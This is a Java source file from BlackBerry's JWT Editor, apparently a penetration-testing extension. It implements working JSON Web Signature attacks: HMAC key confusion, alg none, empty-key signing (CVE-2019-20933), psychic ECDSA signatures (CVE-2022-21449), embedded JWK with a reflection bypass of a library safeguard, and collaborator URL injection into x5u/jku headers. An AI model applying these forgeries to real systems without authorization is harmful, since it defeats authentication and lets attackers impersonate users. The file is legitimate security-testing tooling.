/*
Author : Fraser Winterborn

Copyright 2021 BlackBerry Limited

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package com.blackberry.jwteditor.operations;

import com.blackberry.jwteditor.exceptions.PemException;
import com.blackberry.jwteditor.exceptions.SigningException;
import com.blackberry.jwteditor.exceptions.UnsupportedKeyException;
import com.blackberry.jwteditor.model.jose.JWS;
import com.blackberry.jwteditor.model.jose.JWSFactory;
import com.blackberry.jwteditor.model.keys.JWKKey;
import com.blackberry.jwteditor.model.keys.JWKKeyFactory;
import com.blackberry.jwteditor.model.keys.Key;
import com.blackberry.jwteditor.utils.ByteArrayUtils;
import com.blackberry.jwteditor.utils.PEMUtils;
import com.nimbusds.jose.JOSEObjectType;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.OctetSequenceKey;
import com.nimbusds.jose.util.Base64URL;
import org.json.JSONObject;

import java.lang.reflect.Field;
import java.util.Set;

import static com.blackberry.jwteditor.model.jose.JWSFactory.jwsFromParts;
import static com.nimbusds.jose.HeaderParameterNames.*;
import static com.nimbusds.jose.JWSAlgorithm.*;

/**
 * Implementations of common JWS attacks
 */
public class Attacks {
    private static final Set<JWSAlgorithm> SYMMETRIC_ALGORITHMS = Set.of(HS256, HS384, HS512);
    private static final Set<JWSAlgorithm> ECDSA_ALGORITHMS = Set.of(ES256, ES384, ES512);
    private static final byte[] EMPTY_KEY = new byte[64];
    private static final byte ASN1_SEQUENCE_TYPE = 0x30;
    private static final byte ASN1_INTEGER_TYPE = 0x2;
    private static final String X5U_TEMPLATE = "https://%s/cert.pem";
    private static final String JWK_TEMPLATE = "https://%s/jwks.json";

    /**
     * Perform a HMAC key confusion attack
     * Method based on <a href="https://www.nccgroup.com/ae/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/">this post</a>.
     *
     * @param jws the JWS to sign
     * @param key the public key to use for the attack
     * @param algorithm the HMAC algorithm to sign with
     * @param stripTrailingNewlines remove trailing '/n' characters from the public key
     * @return a JWS signed using HMAC with the RSA public key
     * @throws PemException if the RSA public key is not a valid PEM
     * @throws UnsupportedKeyException if HMAC key creation fails
     * @throws SigningException if signing fails
     */
    public static JWS hmacKeyConfusion(JWS jws, JWKKey key, JWSAlgorithm algorithm, boolean stripTrailingNewlines) throws PemException, UnsupportedKeyException, SigningException {

        // Convert the key to its public key in PEM format
        byte[] pemBytes = PEMUtils.jwkToPem(key.getJWK().toPublicJWK()).getBytes();

        // Remove any trailing /n (0xOA) characters from the PEM
        if(stripTrailingNewlines){
            pemBytes = ByteArrayUtils.trimTrailingBytes(pemBytes, (byte) 0x0A);
        }

        // Build a new header for the chosen HMAC algorithm
        JWSHeader signingInfo = new JWSHeader.Builder(algorithm).type(JOSEObjectType.JWT).build();

        // Construct a HMAC signing key from the PEM bytes
        JWKKey signingKey = JWKKeyFactory.from(new OctetSequenceKey.Builder((pemBytes)).build());

        // Sign and return the new JWS
        Base64URL header = signingInfo.toBase64URL();
        Base64URL payload = jws.getEncodedPayload();

        return JWSFactory.sign(signingKey, header, payload, signingInfo);
    }

    /**
     * Remove the signature from a JWS
     *
     * @param jws the JWS to use for the attack
     * @param algorithm value to use for the algorithm
     * @return the modified JWS
     */
    public static JWS noneSigning(JWS jws, String algorithm){
        String decodedHeader = String.format("{\"typ\":\"JWT\",\"alg\":\"%s\"}", algorithm); //NON-NLS
        Base64URL header = Base64URL.encode(decodedHeader);
        return jwsFromParts(header, jws.getEncodedPayload(), Base64URL.encode(new byte[0]));
    }

    //  CVE-2019-20933 => https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
    public static JWS signWithEmptyKey(JWS jws, JWSAlgorithm algorithm) throws UnsupportedKeyException, SigningException {
        if (!SYMMETRIC_ALGORITHMS.contains(algorithm)) {
            throw new IllegalArgumentException("Invalid algorithm %s. Can only use symmetric algorithms.".formatted(algorithm));
        }

        JSONObject headerJsonObject = new JSONObject(jws.getHeader());
        headerJsonObject.put(ALGORITHM, algorithm.getName());
        Base64URL headerBase64 = Base64URL.encode(headerJsonObject.toString());

        Key key = JWKKeyFactory.from(new OctetSequenceKey.Builder(EMPTY_KEY).build());

        return JWSFactory.sign(key, algorithm, headerBase64, jws.getEncodedPayload());
    }

    //  CVE-2022-21449 => https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
    public static JWS signWithPsychicSignature(JWS jws, JWSAlgorithm algorithm) {
        if (!ECDSA_ALGORITHMS.contains(algorithm)) {
            throw new IllegalArgumentException("Invalid algorithm %s. Can only use NIST elliptic curve algorithms.".formatted(algorithm));
        }

        JSONObject headerJsonObject = new JSONObject(jws.getHeader());
        headerJsonObject.put(ALGORITHM, algorithm.getName());
        Base64URL headerBase64 = Base64URL.encode(headerJsonObject.toString());

        int zeroBytesLength = 1; // DER encoding cannot have leading zeros to pad signature to expected length and this is enforced
        int signatureLength = 6 + (2 * zeroBytesLength);
        byte[] signature = new byte[signatureLength];

        signature[0] = ASN1_SEQUENCE_TYPE;
        signature[1] = (byte) (signatureLength - 2);
        signature[2] = ASN1_INTEGER_TYPE;
        signature[3] = (byte) zeroBytesLength;
        signature[4 + zeroBytesLength] = ASN1_INTEGER_TYPE;
        signature[5 + zeroBytesLength] = (byte) zeroBytesLength;

        Base64URL encodedSignature = Base64URL.encode(signature);

        return JWSFactory.jwsFromParts(headerBase64, jws.getEncodedPayload(), encodedSignature);
    }

    /**
     * Perform the embedded JWK attack
     *
     * @param jws the JWS to attack
     * @param key the JWK to embed
     * @param algorithm the algorithm to use for signing
     * @return a JWS with embedded JWK
     * @throws SigningException if signing fails
     */
    public static JWS embeddedJWK(JWS jws, JWKKey key, JWSAlgorithm algorithm) throws SigningException, NoSuchFieldException, IllegalAccessException {
        JWK embeddedKey = key.isPublic() ? key.getJWK().toPublicJWK() : key.getJWK();
        JWSHeader.Builder jwsHeaderBuilder = new JWSHeader.Builder(algorithm)
                .type(JOSEObjectType.JWT)
                .keyID(key.getID());

        // nimbus-jose-jwt adds a check to jwk() to prevent embedding private keys in 9.21
        // We need to do this, so bypass the check using reflection
        Field f = jwsHeaderBuilder.getClass().getDeclaredField("jwk"); //NON-NLS
        f.setAccessible(true);
        f.set(jwsHeaderBuilder, embeddedKey);

        JWSHeader jwsHeader = jwsHeaderBuilder.build();

        Base64URL header = jwsHeader.toBase64URL();
        Base64URL payload = jws.getEncodedPayload();

        return JWSFactory.sign(key, header, payload, jwsHeader);
    }

    public static JWS embedCollaboratorPayload(JWS jws, String location, String collaboratorPayload) {
        JSONObject headerJsonObject = new JSONObject(jws.getHeader());

        String url = switch (location) {
            case X_509_CERT_URL -> X5U_TEMPLATE.formatted(collaboratorPayload);
            case JWK_SET_URL -> JWK_TEMPLATE.formatted(collaboratorPayload);
            default -> collaboratorPayload;
        };

        headerJsonObject.put(location, url);
        Base64URL headerBase64 = Base64URL.encode(headerJsonObject.toString());

        return jwsFromParts(headerBase64, jws.getEncodedPayload(), jws.getEncodedSignature());
    }
}
